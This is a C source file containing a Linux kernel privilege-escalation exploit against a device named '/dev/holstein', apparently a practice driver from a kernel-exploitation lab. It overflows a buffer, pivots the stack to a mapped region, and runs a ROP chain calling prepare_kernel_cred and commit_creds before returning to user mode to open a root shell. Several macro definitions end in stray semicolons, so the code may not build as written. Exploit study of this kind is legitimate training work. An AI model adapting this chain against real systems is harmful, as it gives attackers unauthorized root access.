#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags;
#define prepare_kernel_cred 0xffffffff8106e240;
#define commit_creds 0xffffffff8106e390;
#define rdi 0xffffffff8127bbdc; // pop rdi ; ret
#define mov_rdi_rax                                                            \
  0xffffffff8160c96b; // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr
                      // [rsi] ; ret
#define swapgs 0xffffffff8160bf7e; // swapgs ; ret
#define iretq 0xffffffff810202af;
#define rcx 0xffffffff8132cdd3; // pop rcx ; ret
#define esp 0xffffffff81507c39; // mov esp, 0xf6000000
static void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh", argv, envp);
}
static void save_state() {
  asm("movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags));
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  save_state();

  int fd = open("/dev/holstein", O_RDWR);
  // if (fd == -1) fatal("open(\"/dev/holstein\")");

  char buf[0x500];
  memset(buf, 'A', 0x408);
  unsigned long *add = (unsigned long *)&buf[0x408];
  *add++ = esp;

  unsigned long *chain = mmap((void *)0xf6000000 - 0x1000, 0x2000,
                              PROT_READ | PROT_WRITE | PROT_EXEC,
                              MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
  unsigned off = 0x1000 / 8 - 1;
  *chain++ = 0xdeadbeef;
  chain[off++] = rdi;
  chain[off++] = 0;
  chain[off++] = prepare_kernel_cred;
  chain[off++] = rcx;
  chain[off++] = 0;
  chain[off++] = mov_rdi_rax;
  chain[off++] = commit_creds;
  chain[off++] = swapgs;
  chain[off++] = iretq;
  chain[off++] = (unsigned long)&win;
  chain[off++] = user_cs;
  chain[off++] = user_rflags;
  chain[off++] = user_rsp;
  chain[off++] = user_ss;

  write(fd, buf, 0x500);

  close(fd);
  return 0;
}
